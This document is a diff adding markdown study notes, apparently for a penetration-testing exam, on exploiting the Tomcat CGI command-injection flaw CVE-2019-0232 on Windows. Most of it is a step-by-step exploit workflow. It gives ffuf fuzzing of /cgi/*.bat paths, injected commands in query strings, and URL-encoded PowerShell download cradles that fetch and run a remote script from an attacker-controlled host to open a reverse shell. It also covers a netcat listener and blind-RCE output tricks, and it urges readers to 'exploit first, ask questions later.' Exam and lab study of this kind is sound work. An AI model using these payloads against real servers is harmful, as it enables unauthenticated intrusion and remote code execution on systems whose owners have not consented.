@@ -1,0 +1,147 @@
+🧨 Tomcat CGI Exploit (CVE-2019-0232) — Summary
+This ain’t your average misconfigured Tomcat manager console. This is a CGI-based RCE via command injection specifically on Windows.
+
+⚙️ What's the difference between this and "regular" Tomcat?
+Category	Regular Tomcat	Tomcat + CGI (CVE-2019-0232)
+Purpose	Java web app hosting	Extend Tomcat to execute external scripts like .bat, .cmd, .pl, etc.
+Tech Stack	Java-only (WARs, JSP, servlets)	Tomcat calls external programs (like Bash or Batch scripts) via CGI Servlet
+Exploitation Vector	Usually via misconfig like weak creds to /manager, vulnerable apps, outdated libs	Command injection through unsanitized input when enableCmdLineArguments=true
+OS Focus	Works on all platforms	Only exploitable on Windows with CGI + cmd/batch support
+Common Ports	8080, 8009, etc.	Same ports, but exploitation path is through /cgi/*.bat?&injected_command
+Risk Source	Misconfig, outdated versions, app vulnerabilities	Poor validation of command-line arguments + Windows command line quirks
+Requires Valid Credentials?	Sometimes (e.g. manager console)	Nope — this is unauthenticated RCE if the setup is vulnerable
+💣 What Makes This Exploit Possible?
+enableCmdLineArguments=true is set
+
+Windows Batch or CMD scripts are served from /cgi/
+
+Query strings (?&dir, ?&whoami) are passed directly to the command line
+
+Tomcat fails to sanitize those arguments = command injection
+
+You URL-encode commands to bypass Tomcat filters
+
+🛠️ Exploit Workflow (TL;DR):
+http
+Copy
+Edit
+http://<target>:8080/cgi/welcome.bat?&<injected_command>
+If it errors, try:
+
+http
+Copy
+Edit
+http://<target>:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+You can escalate this to:
+
+http
+Copy
+Edit
+http://<target>:8080/cgi/welcome.bat?&powershell+-nop+-w+hidden+-c+IEX(New-Object+Net.WebClient).DownloadString('http://YOUR-IP/shell.ps1')
+🧠 Bonus Mindset
+This Tomcat CGI setup is rare, but when it’s there — it’s like Tomcat left the keys under the mat and drew you a treasure map.
+
+So if you see:
+
+Tomcat version ≤ 9.0.17
+
+Running on Windows
+
+A /cgi/ path
+
+.bat or .cmd files
+
+...you stop what you're doing and exploit first, ask questions later.
+
+Let’s break why this screams exam material:
+
+🎯 Why CVE-2019-0232 Is Exam-Worthy
+Reason	Why It Matters
+🔒 Unauthenticated RCE	No creds needed = high impact, low effort
+🪟 Windows-specific	Forces you to recognize platform + path quirks
+🛠️ Needs Enumeration	You gotta find .bat files via ffuf or similar
+🚫 Not Obvious	No default /manager/html or creds = throws off script kiddies
+🧠 Requires Reasoning	Requires understanding how CGI works, how Windows handles command-line arguments, and how to bypass filters
+📦 Precise Version Range	Exploitable only on 9.0.17 and earlier = tests your version parsing + research game
+📤 Payload Crafting	You have to manually build a working reverse shell via URL-encoding — not just run a pre-built script
+🧩 Edge-case vuln	Good for seeing if you go beyond basic web or enum flow
+✅ Your CPTS Mental Flow for This
+Find Tomcat on port 8080
+
+Check version in HTTP headers or HTML — look for ≤ 9.0.17
+
+Check if it’s Windows (from headers, set, or dir)
+
+Fuzz /cgi/*.bat or .cmd with ffuf or dirsearch
+
+Craft test payload — try ?&dir or ?&set
+
+If PATH is empty, try full path like:
+
+perl
+Copy
+Edit
+?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+Pop a shell with powershell or certutil download cradle
+
+🧠 “Got This, Do That” - Tomcat CGI RCE (CVE-2019-0232)
+Got This ➜ Do That
+Tomcat on port 8080
+✅ Check version in HTML or headers
+🔍 Apache Tomcat/9.0.17 or lower
+➡️ Vulnerable version
+
+CGI folder exposed (/cgi/)
+➡️ Fuzz for .bat or .cmd scripts
+
+bash
+Copy
+Edit
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<IP>:8080/cgi/FUZZ.bat
+➡️ Look for hit like: /cgi/welcome.bat
+
+Response says something like “Welcome to CGI...”
+✅ Valid endpoint
+➡️ Test for command injection
+
+http
+Copy
+Edit
+http://<IP>:8080/cgi/welcome.bat?&dir
+➡️ If you see directory listing, RCE is on the table
+
+Command like whoami fails
+✅ Likely PATH is unset
+➡️ Use hardcoded full path + URL encoding
+
+http
+Copy
+Edit
+http://<IP>:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+Need a reverse shell?
+➡️ Use URL-encoded PowerShell cradle
+
+http
+Copy
+Edit
+http://<IP>:8080/cgi/welcome.bat?&powershell%20-nop%20-w%20hidden%20-c%20%22IEX(New-Object%20Net.WebClient).DownloadString('http://<LHOST>/rev.ps1')%22
+(Or certutil, bitsadmin, etc.)
+
+Need to bypass output issues (blind RCE)?
+➡️ Write output to file, then fetch file in browser
+
+http
+Copy
+Edit
+?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe%20>%20C:\tomcat\webapps\ROOT\whoami.txt  
+➡️ http://<IP>:8080/whoami.txt
+⚡ Quickfire Exploit Checklist
+Step	Command
+Version check	Look for Apache Tomcat/9.0.17 in / or /manager/html
+Fuzz CGI	ffuf -w ... -u http://<IP>:8080/cgi/FUZZ.bat
+Test injection	?&dir
+Hardcoded path	?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+Shell (encoded)	?&powershell%20...%20DownloadString()
+Reverse shell	nc -lvnp 443 + your payload
+
+
